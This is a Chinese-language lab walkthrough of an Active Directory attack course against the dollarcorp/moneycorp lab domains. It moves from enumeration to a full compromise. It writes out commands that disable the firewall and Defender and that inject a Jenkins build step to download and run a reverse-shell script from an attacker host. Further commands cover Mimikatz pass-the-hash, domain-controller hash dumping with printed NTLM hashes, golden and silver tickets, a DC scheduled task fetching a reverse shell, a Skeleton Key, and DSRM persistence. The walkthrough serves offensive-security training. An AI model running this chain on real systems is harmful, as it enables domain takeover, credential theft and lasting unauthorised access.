# Learning Objective 1:


```Task
● Enumerate following for the dollarcorp domain:
− Users
− Computers
− Domain Administrators
− Enterprise Administrators
− Shares
```


## 首先bypass powershell policy和AMSI，然后引入powerview

![image-20220306164751994](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306164751994.png)



## Users

命令：```Get-NetUser |select cn```

![image-20220306164958853](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306164958853.png)

## Computers

枚举当前域所有计算机

命令：``` Get-NetComputer```

![image-20220306165137578](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306165137578.png)

## Domain Administrators



枚举所有DA

命令：```Get-NetGroupMember -GroupName "Domain Admins" -Recurse```

![image-20220306165428856](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306165428856.png)



## Enterprise Administrators



Enterprise Administrators属于父域的用户组，所以枚举的时候需要加上父域的名称

命令：``` Get-NetGroupMember -GroupName "Enterprise Admins" -domain moneycorp.local  -Recurse```

![image-20220306170005975](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306170005975.png)



## Shares

命令：```Invoke-ShareFinder```

![image-20220306170243592](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306170243592.png)





# Learning Objective 2
```Task
● Enumerate following for the dollarcorp domain:
− List all the OUs
− List all the computers in the StudentMachines OU.
− List the GPOs
− Enumerate GPO applied on the StudentMachines OU.
```



##  List all the OUs

命令：```get-netou```

![image-20220306170550692](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306170550692.png)

## List all the computers in the StudentMachines OU.

命令：```Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}```

![image-20220306170653672](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306170653672.png)

## List the GPOs

命令：``` Get-NetGPO```

![image-20220306170836864](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306170836864.png)



## Enumerate GPO applied on the StudentMachines OU.

这里分两步

先获取StudentMachines里OU值里的gplink这个字段的值
```
PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
[LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
```

以上面的gplink作为传入参数，查询符合这个条件的所有GPO



```Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'```

![image-20220306171114786](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306171114786.png)





# Learning Objective 3:
```Task
● Enumerate following for the dollarcorp domain:
− ACL for the Users group
− ACL for the Domain Admins group
− All modify rights/permissions for the studentx
```



## ACL for the Users group

命令：```Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose```

![image-20220306171849514](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306171849514.png)

## ACL for the Domain Admins group

命令：```Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose```

![image-20220306172108674](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306172108674.png)

## All modify rights/permissions for the studentx

查看本账号所有修改的权限

命令：```Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "sudent366"}```

![image-20220306172243711](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306172243711.png)

啥都没有



# Learning Objective 4:

```Task
● Enumerate all domains in the moneycorp.local forest.
● Map the trusts of the dollarcorp.moneycorp.local domain.
● Map External trusts in moneycorp.local forest.
● Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
```



## Enumerate all domains in the moneycorp.local forest.

枚举森林里所有域

命令：``` Get-NetForestDomain -Forest  moneycorp.local```

![image-20220306165807913](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306165807913.png)

父域：moneycorp.local
父域DC：mcorp-dc.moneycorp.local

当前域：dollarcorp.moneycorp.local
当前域DC:dcorp-dc.dollarcorp.moneycorp.local

子域：us.dollarcorp.moneycorp.local



## Map the trusts of the dollarcorp.moneycorp.local domain.

枚举当前域的所有信任关系

命令：``` Get-NetDomainTrust -Domain dollarcorp.moneycorp.local```

![image-20220306172917520](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306172917520.png)



## Map External trusts in moneycorp.local forest.

枚举指定森林里的外部信任

命令：```Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq "External"} ```



![image-20220306173102532](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306173102532.png)

## Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?

注意上面dollarcorp.moneycorp.local和eurocorp.local的信任关系是Bidirectional（双向）的，所以我们可以从eurocorp.local里提取信息

命令：``` Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust```

![image-20220306173206243](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306173206243.png)



# Learning Objective 5:
```Task
● Exploit a service on dcorp-studentx and elevate privileges to local administrator.
● Identify a machine in the domain where studentx has local administrative access.
● Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server.
```



## Exploit a service on dcorp-studentx and elevate privileges to local administrator.

引入powerup，全盘检测，有至少两个方法可以提权

一个是未加引号的路径

![image-20220306174836200](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306174836200.png)



一个是可修改的服务

![image-20220306174917310](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306174917310.png)



利用可修改的服务，把当前账号加入到本地管理员组

命令：``` Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student366'```

![image-20220306175023097](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306175023097.png)



测试验证是否提权成功，以管理员身份打开一个shell，输入当前账号的用户名和密码

![image-20220306184512081](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306184512081.png)



已成功提权到管理员权限

## Identify a machine in the domain where studentx has local administrative access.

在上面的管理员权限shell里引入powerview，枚举当前账号有本地管理员权限的计算机

![image-20220306184832811](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306184832811.png)

除了当前计算机外还有一台机器

```dcorp-adminsrv.dollarcorp.moneycorp.local```





## Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server.

用```netsh advfirewall show currentprofile```命令查看防火墙状态

用```NetSh Advfirewall set allprofiles state off```命令关闭防火墙

关闭以后再次查看防火墙，已成功关闭

![image-20220306185145590](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306185145590.png)



关掉实时防护
```
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```



## Jenkins!

在浏览器打开```http://172.16.3.11:8080```

运行了一个Jenkins! 程序

![image-20220306185427597](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306185427597.png)





jenkin!这个web app在未登陆的情况下，可以通过下面页面查看有什么账号
```http://172.16.3.11:8080/asynchPeople//```

![image-20220306185717493](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306185717493.png)

可以看到有builduser，jenkinsadmin，	manager三个账号

手动测试发现

Jenkins 登录账号信息是：
```builduser:builduser```

Jenkins特权提升，可以通过两种方法
1.  第一种是访问```http://172.16.3.11:8080/script```页面，如果当前账号拥有权限，将会被允许使用一个在线的console
2.  第二种是通过执行任务（例子页面：```http://172.16.3.11:8080/job/project0/```）,编译一段powershell反弹回来一个shell提权

powercat监听：

![image-20220306185837134](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306185837134.png)







另起一个shell，用python在ad工具目录下开一个http服务

![image-20220306190022728](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306190022728.png)



去到```http://172.16.3.11:8080/me/my-views/view/all/```

选择其中一个project

![image-20220306190216002](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306190216002.png)

点击configure

![image-20220306190331244](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306190331244.png)

选择Build

![image-20220306190436222](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306190436222.png)

把命令：

```powershell.exe iex (iwr http://172.16.100.66/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.66 -Port 443```

填入command，并且点击保存

![image-20220306190527275](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306190527275.png)





点击Build Now，收到反弹回来的shell

![image-20220306190757811](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306190757811.png)



# Learning Objective 6:
Task
● Setup BloodHound and identify a machine where studentx has local administrative access.

![image-20220306200024291](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306200024291.png)



从 BloodHound属于RDPUSERS组，这个组的成员对DCORP-ADMINSRV这台计算机有local administrative权限

所有student都在RDPUSERS组

![image-20220306200346148](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306200346148.png)



# Learning Objective 7

```Task
● Domain user on one of the machines has access to a server where a domain admin is logged in.
Identify:
− The domain user
− The server where the domain admin is logged in.
● Escalate privileges to Domain Admin
− Using the method above.
−  Using derivative local admin 
```





● Domain user on one of the machines has access to a server where a domain admin is logged in.
Identify:

从BloodHound可以知道svcadmin登录过dcorp-mgmt

![image-20220306200817797](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306200817797.png)

− The domain user

```svcadmin```

− The server where the domain admin is logged in.

```dcorp-mgmt```



● Escalate privileges to Domain Admin
− Using the method above.
−  Using derivative local admin 

这里采取从jenkins得到的管理员权限横向移动到```dcorp-mgmt```进行域权限提升的方法

引入powerview

```
iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
```



记得要bypass ps和AMSI

![image-20220306201616173](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306201616173.png)

可以看到可以横向到```dcorp-mgmt.dollarcorp.moneycorp.local```

引入mimikatz，导出ciadmin的哈希

![image-20220306202132064](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306202132064.png)



使用pass the hash，用收集回来的NTML新开一个ciamdin的shell

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:ciadmin /domain:dollarcorp.moneycorp.local /ntlm:e08253add90dccf1a208523d02998c3d /run:powershell.exe"'
```

横向到dcorp-mgmt

![image-20220306202552460](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306202552460.png)

引入mimikatz，导出scvadmin的NTML，这里甚至还有明文密码

![image-20220306202814646](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306202814646.png)

至此我们已经拿到了域管理员svcadmin的NTML



```scvadmin : b38ff50264b74508085d82c69794a4d8```



# Learning Objective 8:
```Task
● Dump hashes on the domain controller of dollarcorp.moneycorp.local.
● Using the NTLM hash of krbtgt account, create a Golden ticket.
● Use the Golden ticket to (once again) get domain admin privileges from a machine.
```



 ## Dump hashes on the domain controller of dollarcorp.moneycorp.local.

用上面收集到svcadmin账号信息，开一个DA的shell



```Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'```



可以看到我们现在已经可以横向到DC

![image-20220306203520614](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306203520614.png



![image-20220306203556004](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306203556004.png)



进入DC以后，bypass everything。dump出DC里的所有NTML信息

![image-20220306203808443](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306203808443.png)





已经拿到Administrator和krbtgt的用户信息

```

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : ff46a9d8bd66c6efd77603da26796f35

```



## Using the NTLM hash of krbtgt account, create a Golden ticket.

使用krbtgt制作黄金票据

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-
21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```



验证金票：
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```

![image-20220306204917861](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306204917861.png)





## Use the Golden ticket to (once again) get domain admin privileges from a machine.



因为制作了DA权限的黄金票据，所以可以横向到域内任何一台计算机，包括DC，也就是说可以dump出DC上的所有NTML哈希

![image-20220306205213235](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306205213235.png)









# Learning Objective 9:
```Task
● Try to get command execution on the domain controller by creating silver ticket for:
− HOST service
− WMI
```



这一节是制作银票。

金票和银票的分别
> 1.金票伪造的TGT(Ticket GrantingTicket)，所以可以获取任何Kerberos服务权限
> 2.银票是伪造的TGS的TS，只能访问指定的服务权限
> 3.GoldenTicket是由krbtgt的hash加密
> 4.Silver Ticket是由服务账户（通常为计算机账户）hash加密
> 5.GoldenTicket在使用的过程需要同域控通信
> 6.Silver Ticket在使用的过程不需要同域控通信

上面我们已经知道了DCORP-DC$的哈希，
```
RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : 126289c16302fb23b71ec09f0d3d5391
```
可以用来制作银票

```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```



![image-20220306205608943](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306205608943.png)



打开Invoke-PowerShellTcp.ps1这个文件，在文件最低端加一行代码

```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```



![image-20220306205738398](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306205738398.png)

表示调用自己

新开一个shell，开启监听

![image-20220306210128953](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306210128953.png)



在银票shell下制作一个定时任务

```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User3666" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```



触发定时任务

```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User3666"
```



收到DC返回来的shell

![image-20220306210618463](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306210618463.png)

## WMI

RPCSS
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

然后执行WMI 

```
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

![image-20220306210901046](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306210901046.png)

# Learning Objective 10:
```Task
● Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack.
```

开一个DA shell

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```


### 方法1
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
### 方法2(推荐)
回到学生机器,创建一个DC的登录session
```
$sess = New-PSSession dcorp-dc.dollarcorp.moneycorp.local
```

把mimikatz加载到指定session
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

再次进入DC
```
 Enter-PSSession -Session $sess
```

执行mimikatz，制作万能钥匙
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```

开一个学生shell使用下面命令以student359的身份进入主机
```Enter-PSSession –Computername dcorp-std359.dollarcorp.moneycorp.local –credential dcorp\student359```



![image-20220306214152645](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306214152645.png)



输入密码：mimikatz



成功登陆

![image-20220306214255750](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306214255750.png)

# Learning Objective 11:
```Task
● Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.
```



目录服务还原模式。除了krbtgt服务帐号外，域控上还有个可利用的账户：目录服务还原模式（DSRM）账户，这个密码是在DC安装的时候设置的，所以一般不会被修改

用有DA权限的shell，运行下面命令，dump出DSRM的哈希密码

![image-20220306220745688](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306220745688.png)



这里会出现Administrator的哈希(也就是DSRM的密码)：```a102ad5753f4c441e3af31c97fad86fd```

再用下面命令dump出现在Administrator的密码，与上面DSRM的密码进行比较

![image-20220306220856677](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306220856677.png)

新的密码是：```af0686cc0ca8f04df42210c9ac980760```

DSRM administrator不允许登陆，用之前的session进入DC修改

要先bypass ASMI

再运行下面命令，修改DSRM的远程登录策略
```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```



现在用DSRM的原始哈希，来运行一个有DA权限的shell,注意，这里的/domain参数指定的是dcorp-dc这台计算机，不是域的名字



```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

验证：

```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```



![image-20220306221226953](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306221226953.png)

可以访问文件系统，但是不能在这台系统上执行命令。

如果想要用DSRM获得一个shell，可以设置一个定时任务